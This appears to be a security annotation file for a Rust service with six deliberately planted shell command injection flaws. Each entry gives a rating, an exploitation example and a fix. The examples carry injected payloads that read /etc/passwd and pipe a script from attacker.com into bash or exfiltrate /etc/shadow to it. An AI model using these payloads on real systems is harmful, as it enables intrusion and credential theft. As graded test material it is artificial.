# Security Companion Document: main.rs

## Vulnerability: Direct Command Injection via Command::new in Ping

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Obvious  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L82-L83  

### Description
The `ping_host` function constructs a shell command by using `format!` to embed the user-supplied `host` query parameter into a string, then passes it to `Command::new("sh").arg("-c")`. The `host` value from the deserialized `PingQuery` struct is interpolated without any sanitization or validation.

### Exploitation Scenario
An attacker sends `GET /api/ping?host=127.0.0.1;cat /etc/passwd`. The semicolon terminates the `ping` command and executes `cat /etc/passwd`, returning sensitive system file contents. More destructive payloads such as reverse shell commands could achieve full system compromise.

### Remediation Guidance
Use `Command::new` with separate arguments to avoid shell interpretation:
```rust
let output = Command::new("ping").args(["-c", "3", &host]).output();
```
Additionally, validate the `host` parameter against a hostname/IP regex pattern.

### Complexity Rationale
This is rated Obvious because user input flows directly from the query parameter into `Command::new("sh").arg("-c")` with `format!` string interpolation, a textbook command injection pattern.

### Detection Difficulty Rationale
This is rated Easily_Detectable because `Command::new("sh").arg("-c")` with user-controlled format strings is a well-known dangerous pattern that Rust SAST tools and Semgrep rules flag reliably.

---

## Vulnerability: Shell Command Injection via Command::new in DNS Lookup Helper

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L94-L95  

### Description
The `run_dig` helper function constructs a shell command using `format!` to embed the `domain` parameter into a `dig` command string, then executes it via `Command::new("sh").arg("-c")`. Although the `record_type` is validated against an allowlist in the calling `dns_lookup` function, the `domain` parameter is passed through without sanitization.

### Exploitation Scenario
An attacker sends `GET /api/dns/lookup?domain=example.com;id`. The `domain` value is interpolated into the shell command as `dig A example.com;id +short`, causing the shell to execute both `dig` and `id`.

### Remediation Guidance
Use `Command::new` with separate arguments:
```rust
fn run_dig(domain: &str, record_type: &str) -> String {
    match Command::new("dig").args([record_type, domain, "+short"]).output() {
        Ok(output) => String::from_utf8_lossy(&output.stdout).trim().to_string(),
        Err(_) => String::new(),
    }
}
```

### Complexity Rationale
This is rated Moderate because the vulnerability is in a separate helper function called from the async route handler. The `record_type` parameter is validated against an allowlist, which may create a false sense of security.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because SAST tools need interprocedural analysis to track the taint from the deserialized query struct through `dns_lookup` into `run_dig` and into the `Command::new` call with `sh -c`.

---

## Vulnerability: Multi-Parameter Command Injection in Log Search

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L133  

### Description
The `search_logs` function constructs a shell pipeline command using `format!` that embeds three user-controlled parameters: `lines`, `log_path` (derived from the `log_file` parameter), and `keyword`. All three are interpolated into a `tail | grep` pipeline and executed via `Command::new("sh").arg("-c")`. The `keyword` is wrapped in single quotes, but this provides no real protection since an attacker can break out of the quotes.

### Exploitation Scenario
An attacker sends `GET /api/logs/search?keyword=error'%3B%20id%20%23&file=syslog&lines=100`. The single quote breaks out of the grep pattern, the semicolon starts a new command, and `#` comments out the rest. The `lines` parameter can also inject commands through the numeric field.

### Remediation Guidance
Avoid shell pipelines. Use separate `Command` calls and pipe output programmatically:
```rust
let tail_output = Command::new("tail").args(["-n", &lines, &log_path]).output()?;
let grep = Command::new("grep").arg(&keyword)
    .stdin(std::process::Stdio::piped()).output()?;
```

### Complexity Rationale
This is rated Nuanced because three separate user-controlled parameters are injected into a single shell pipeline, and the single-quote wrapping around the keyword creates a false appearance of sanitization. A reviewer must recognize that all three parameters are attack vectors.

### Detection Difficulty Rationale
This is rated Likely_Missed because the multiple injection points within a shell pipeline, combined with the pseudo-sanitization of single quotes, make this difficult for SAST tools to fully analyze.

---

## Vulnerability: Command Injection via Shell Execution in Archive

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Pattern_Dependent  
**Affected Lines:** L189  

### Description
The `archive_files` function constructs a shell command using `format!` to embed `body.path` from the JSON request body into a `tar` command, then executes it via `Command::new("sh").arg("-c")`. While the `archive_name` undergoes basic sanitization (replacing `/` and `\` with `_`), the `body.path` parameter is embedded directly without any validation.

### Exploitation Scenario
An attacker sends `POST /api/files/archive` with body `{"path": "/tmp/data; curl attacker.com/shell.sh | bash", "name": "backup"}`. The path value is interpolated into the `tar` command, and the shell executes the injected commands.

### Remediation Guidance
Use `Command::new` with argument lists:
```rust
let output = Command::new("tar").args(["czf", &archive_path, &body.path]).output();
```

### Complexity Rationale
This is rated Moderate because the vulnerability is partially obscured by the sanitization applied to the adjacent `archive_name` parameter. A reviewer must recognize that `body.path` bypasses the sanitization.

### Detection Difficulty Rationale
This is rated Pattern_Dependent because the taint flows from the deserialized JSON body through struct fields into `format!` and then to `Command::new` with shell execution.

---

## Vulnerability: Command Injection via Shell Execution in Port Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Moderate  
**Detection Difficulty:** Easily_Detectable  
**Affected Lines:** L200  

### Description
The `check_port` function constructs a shell command using `format!` to embed `body.host` into a `nc` (netcat) command, then executes it via `Command::new("sh").arg("-c")`. While the `body.port` parameter is typed as `u16` (providing automatic range validation), the `body.host` parameter is a `String` embedded directly without sanitization.

### Exploitation Scenario
An attacker sends `POST /api/network/check` with body `{"host": "127.0.0.1; whoami", "port": 80}`. The `host` value is interpolated into the `nc` command, and the shell executes both `nc` and `whoami`.

### Remediation Guidance
Use `Command::new` with argument lists:
```rust
let output = Command::new("nc").args(["-zv", "-w", "3", &body.host, &body.port.to_string()]).output();
```

### Complexity Rationale
This is rated Moderate because the adjacent `port` parameter has type-level validation via `u16`, which may create a false sense of security. However, the `host` parameter is directly embedded without validation.

### Detection Difficulty Rationale
This is rated Easily_Detectable because the taint flow from the deserialized JSON body to `Command::new` with `sh -c` and `format!` is a standard pattern that SAST tools detect reliably.

---

## Vulnerability: Command Injection via Complex Shell Pipeline in Certificate Check

**CWE:** CWE-78  
**OWASP:** A03  
**Complexity Level:** Nuanced  
**Detection Difficulty:** Likely_Missed  
**Affected Lines:** L228-L230  

### Description
The `check_cert` function constructs a complex shell pipeline using `format!` that embeds `body.hostname` three times into an `openssl` command chain. The command pipes through `echo`, `openssl s_client`, and `openssl x509` with shell redirections. The `hostname` from the deserialized `CertCheckRequest` is interpolated without sanitization into multiple positions.

### Exploitation Scenario
An attacker sends `POST /api/certs/check` with body `{"hostname": "example.com;curl attacker.com/exfil?data=$(cat /etc/shadow)"}`. The injected command is executed by the shell, exfiltrating sensitive data.

### Remediation Guidance
Validate the hostname against a strict pattern and avoid shell pipelines:
```rust
let re = regex::Regex::new(r"^[a-zA-Z0-9.-]+$").unwrap();
if !re.is_match(&body.hostname) {
    return HttpResponse::BadRequest().json(ErrorResponse { error: "Invalid hostname".to_string() });
}
```
Or use a Rust TLS library to check certificates programmatically.

### Complexity Rationale
This is rated Nuanced because the vulnerability is embedded within a complex multi-stage shell pipeline with redirections and multiple interpolation points. The `openssl` command chain appears to be a legitimate system administration operation.

### Detection Difficulty Rationale
This is rated Likely_Missed because the complex shell pipeline with multiple pipes, redirections, and `/dev/null` references makes it difficult for SAST tools to parse and analyze. The `hostname` parameter appears in three positions within the command string.
